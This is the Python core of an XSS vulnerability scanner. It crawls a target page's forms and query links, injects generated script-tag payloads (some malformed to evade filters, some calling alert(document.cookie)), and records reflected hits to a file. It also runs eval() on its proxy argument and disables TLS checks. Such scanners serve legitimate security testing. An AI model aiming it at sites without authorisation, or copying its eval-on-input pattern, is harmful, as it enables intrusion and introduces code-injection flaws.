from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *
from lib.dom_xss import DOMXSSDetector
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
	
	@classmethod
	def main(cls, url, proxy, user_agent, payload, cookie, method):
		"""Main scanning method for XSS vulnerabilities"""
		global cookies, payloads, user_agents, proxies, target
		target = url
		cookies = cookie
		payloads = payload
		user_agents = user_agent
		proxies = proxy
		
		scanner = cls()
		scanner.scan_target(url, proxy, user_agent, payload, cookie, method)
	
	def __init__(self):
		"""Initialize core scanner"""
		pass
	
	def scan_target(self, url, proxy, user_agent, payload, cookie, method):
		"""Scan target URL for XSS vulnerabilities"""
		global cookies, payloads, user_agents, proxies, target
		target = url
		cookies = cookie
		payloads = payload
		user_agents = user_agent
		proxies = proxy
		
		try:
			Log.info("Testing target: " + url)
			headers = user_agent if isinstance(user_agent, dict) else {'User-Agent': user_agent}
			proxies_dict = eval(proxy) if proxy else None
			
			sess = session(proxies_dict, headers, cookie)
			ctr = sess.get(url, timeout=10, verify=False)
			self.body = ctr.text
		except Exception as e:
			Log.high("Internal error: "+str(e))
			return
		
		if ctr.status_code > 400:
			Log.info("Connection failed "+G+str(ctr.status_code))
			return 
		else:
			Log.info("Connection estabilished "+G+str(ctr.status_code))
		
		# Set instance variables for use by other methods
		self.url = url
		self.payload = payload
		self.session = sess
		
		if method >= 2:
			self.post_method()
			self.get_method()
			self.get_method_form()
			
		elif method == 1:
			self.post_method()
			
		elif method == 0:
			self.get_method()
			self.get_method_form()
	
	@classmethod
	def generate(self,eff):		
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\\script\\>"
		
		elif eff == 2:
			return "<\\script/>"+FUNCTION[randint(0,4)]+"<\\\\script>"	
			
		elif eff == 3:
			return "<\\script\\> "+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\\script/>"
			
		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
			
	def post_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "post":
				Log.warning("Target have form with POST method: "+C+urljoin(self.url,action))
				Log.info("Collecting form input key.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("Internal error: "+str(e))
				
				Log.info("Sending payload (POST) method...")
				req=self.session.post(urljoin(self.url,action),data=keys)
				if self.payload in req.text:
					Log.high("Detected XSS (POST) at "+urljoin(self.url,req.url))
					file = open("xss.txt", "a")
					file.write(str(req.url)+"\n\n")
					file.close()
					Log.high("Post data: "+str(keys))
				else:
					Log.info("Parameter page using (POST) payloads but not 100% yet...")
	
	def get_method_form(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "get":
				Log.warning("Target have form with GET method: "+C+urljoin(self.url,action))
				Log.info("Collecting form input key.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("Internal error: "+str(e))
						try:
							Log.info("Form key name: "+G+key["name"]+N+" value: "+G+self.payload)
							keys.update({key["name"]:self.payload})
						except KeyError as e:
							Log.info("Internal error: "+str(e))
						
				Log.info("Sending payload (GET) method...")
				req=self.session.get(urljoin(self.url,action),params=keys)
				if self.payload in req.text:
					Log.high("Detected XSS (GET) at "+urljoin(self.url,req.url))
					file = open("xss.txt", "a")
					file.write(str(req.url)+"\n\n")
					file.close()
					Log.high("GET data: "+str(keys))
				else:
					Log.info("\033[0;35;47m Parameter page using (GET) payloads but not 100% yet...")
		
	def get_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		links=bsObj.find_all("a",href=True)
		for a in links:
			url=a["href"]
			if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
				base=urljoin(self.url,a["href"])
				query=urlparse(base).query
				if query != "":
					Log.warning("Found link with query: "+G+query+N+" Maybe a vuln XSS point")
					
					query_payload=query.replace(query[query.find("=")+1:len(query)],self.payload,1)
					test=base.replace(query,query_payload,1)
					
					query_all=base.replace(query,urlencode({x: self.payload for x in parse_qs(query)}))
					
					Log.info("Query (GET) : "+test)
					Log.info("Query (GET) : "+query_all)

					if not url.startswith("mailto:") and not url.startswith("tel:"):					
						_respon=self.session.get(test,verify=False)
						if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
							Log.high("Detected XSS (GET) at "+_respon.url)
							file = open("xss.txt", "a")
							file.write(str(_respon.url)+"\n\n")
							file.close()
						
						else:
							Log.info("Parameter page using (GET) payloads but not 100% yet...")
					else:
						Log.info("URL is not an HTTP url, ignoring")
	
	def dom_xss_scan(self):
		"""
		Perform DOM XSS vulnerability scanning
		"""
		Log.info("Initializing DOM XSS detection...")
		dom_detector = DOMXSSDetector()
		
		# Perform DOM XSS scan
		dom_results = dom_detector.scan_for_dom_xss(
			target_url=self.url,
			proxy=self.session.proxies,
			headers=self.session.headers,
			cookie=str(self.session.cookies.get_dict())
		)
		
		# Log results
		if dom_results.get('has_dom_xss'):
			Log.high("DOM XSS vulnerabilities detected!")
			
			# Save to file
			with open("xss.txt", "a") as file:
				file.write(f"DOM XSS - {self.url}\n")
				if dom_results.get('successful_tests'):
					for test in dom_results['successful_tests']:
						file.write(f"  Payload: {test['payload']}\n")
						file.write(f"  URL: {test['url']}\n")
				file.write("\n")
		else:
			Log.info("No DOM XSS vulnerabilities detected")
			
		return dom_results
